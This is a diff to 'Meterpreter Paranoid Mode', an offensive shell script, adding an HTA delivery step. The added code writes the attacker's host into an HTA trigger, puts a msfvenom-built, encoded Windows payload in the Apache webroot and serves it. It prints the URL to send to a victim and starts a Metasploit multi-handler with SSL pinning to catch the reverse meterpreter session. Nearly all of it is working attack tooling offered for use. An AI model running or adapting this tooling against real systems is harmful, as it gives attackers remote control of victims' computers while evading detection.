@@ -1,7 +1,7 @@
 #!/bin/sh
 ##
 # Meterpreter Paranoid Mode - SSL/TLS connections
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.3
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.4
 # Distros Supported : Linux Kali, Mint, Ubuntu
 # Suspicious-Shell-Activity (SSA) RedTeam dev @2017
 # ---
@@ -31,8 +31,10 @@ resize -s 39 80 > /dev/null
 #
 # Tool variable declarations _______________
 #                                           |
-V3R="1.3"                                   # Tool version release
+V3R="1.4"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
+SeRvi="service postgresql"                  # Command used to start postgresql
+ApAcHe="/var/www/html"                      # Apache2 webroot (hta attack vector)
 # __________________________________________|
 #
 # Read options (configurations) from settings file ..
@@ -45,6 +47,7 @@ ExEc=`cat $IPATH/settings | egrep -m 1 "RUN_POST_EXPLOTATION" | cut -d '=' -f2` 
 PoSt=`cat $IPATH/settings | egrep -m 1 "POST_MODULE" | cut -d '=' -f2` > /dev/null 2>&1 # Msf command to run at session popup?
 VaL=`cat $IPATH/settings | egrep -m 1 "ENABLE_UNICODE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable unicode encoding?
 StAgE=`cat $IPATH/settings | egrep -m 1 "ENABLE_STAGE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable stage encoding?
+HtA=`cat $IPATH/settings | egrep -m 1 "HTA_ATTACK_VECTOR" | cut -d '=' -f2` > /dev/null 2>&1 # Use hta attack vector to deliver agent?
 
 
 #
@@ -136,7 +139,7 @@ if [ "$ChEk_DB" = "ON" ]; then
   # start msfconsole to check postgresql connection status
   #
   echo ${BlueF}[☆]${white}" Starting postgresql service .."${Reset};
-  service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+  $SeRvi start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   echo ${BlueF}[☆]${white}" Checking msfdb connection status .."${Reset};
   # Store db_status core command into one variable
   ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
@@ -270,11 +273,12 @@ else
   #
   echo ${RedF}[x]${white}" Cancel button, aborting .."
   if [ "$ChEk_DB" = "ON" ]; then
-  service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+  $SeRvi stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   fi
   sleep 2
   exit
 fi
+
 
 
 
@@ -343,6 +347,31 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
           mv -f template paranoid-staged.$DEFAULT_EXT
         fi
 
+    #
+    # Use HTA attack vector to deliver the agent ..
+    #
+    if [ "$HtA" = "ON" ]; then
+      echo ${BlueF}[☠]${white} HTA attack vector sellected ..${Reset};
+      cd $IPATH/bin
+      sleep 2
+        #
+        # Building HTA trigger file ..
+        #
+        echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
+        sleep 2
+        sed "s|LhOsT|$LhOsT|" EasyFileSharing.hta > trigger.hta
+        sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|" trigger.hta
+        mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
+        cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+      #
+      # Start apache2 service ..
+      #
+      /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+      # Present URL (attack vector) to user
+      echo ${BlueF}"Attack vector: http://$LhOsT/EasyFileSharing.hta" ${Reset};
+      sleep 2
+      cd $IPATH
+    fi
 
   # 
   # Create the staged Paranoid Listener (multi-handler)
@@ -356,6 +385,12 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   else
     xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit'"
   fi
+  #
+  # Cleaning files & stop apache2 ..
+  #
+  rm $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+  rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
+  /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   sleep 2
 
 
@@ -386,6 +421,32 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o paranoid-stageless.exe
     sleep 2
 
+    #
+    # Use HTA attack vector to deliver the agent ..
+    #
+    if [ "$HtA" = "ON" ]; then
+      echo ${BlueF}[☠]${white} HTA attack vector sellected ..${Reset};
+      cd $IPATH/bin
+      sleep 2
+        #
+        # Building HTA trigger file ..
+        #
+        echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
+        sleep 2
+        sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
+        sed -i "s|NaMe|paranoid-staged.exe|g" trigger.hta
+        mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
+        cp $IPATH/output/paranoid-staged.exe $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
+      #
+      # Start apache2 service ..
+      #
+      /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+      # Present URL (attack vector) to user
+      echo ${BlueF}"Attack vector: http://$LhOsT/EasyFileSharing.hta" ${Reset};
+      sleep 2
+      cd $IPATH
+    fi
+
 
   #
   # Create a stageless Paranoid Listener (multi-handler)..
@@ -399,6 +460,12 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   else
     xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit'"
   fi
+  #
+  # Cleaning files & stop apache2 ..
+  #
+  rm $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
+  rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
+  /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   sleep 2
 
 
@@ -408,7 +475,7 @@ else
   #
   echo ${RedF}[x]${white}" Cancel button, aborting .."
   if [ "$ChEk_DB" = "ON" ]; then
-  service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+  $SeRvi stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   fi
   sleep 2
   exit
@@ -421,7 +488,7 @@ fi
 #
 echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
 if [ "$ChEk_DB" = "ON" ]; then
-service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+$SeRvi stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 fi
 sleep 1
 exit
